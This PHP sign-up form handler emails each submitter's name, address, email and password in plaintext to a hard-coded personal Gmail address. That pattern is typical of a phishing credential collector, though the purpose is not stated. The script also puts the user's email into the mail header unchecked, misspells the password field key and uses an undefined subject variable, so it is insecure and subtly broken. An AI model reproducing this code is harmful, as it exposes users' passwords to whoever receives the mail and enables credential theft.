<?

$destinatario = "higorgames12344@gmail.com";

$nome = $_REQUEST['nome'];
$email = $_REQUEST['email'];
$sobrenome = $_REQUEST['sobrenome'];
$endereco = $_REQUEST['endereco'];
$senha = $_REQUEST['semha'];
 // monta o e-mail na variavel $body

$body = "===================================" . "\n";
$body = $body . "Sign Up for Free" . "\n";
$body = $body . "===================================" . "\n\n";
$body = $body . "Nome: " . $nome . "\n";
$body = $body . "Nomesobre: " . $sobrenome . "\n";
$body = $body . "senha: " . $senha . "\n";
$body = $body . "Email: " . $email . "\n";
$body = $body . "endereco: " . $endereco . "\n\n";
$body = $body . "===================================" . "\n";

// envia o email
mail($destinatario, $assunto , $body, "From: $email\r\n");

// redireciona para a página de obrigado
header("location:index1.html");


?>

 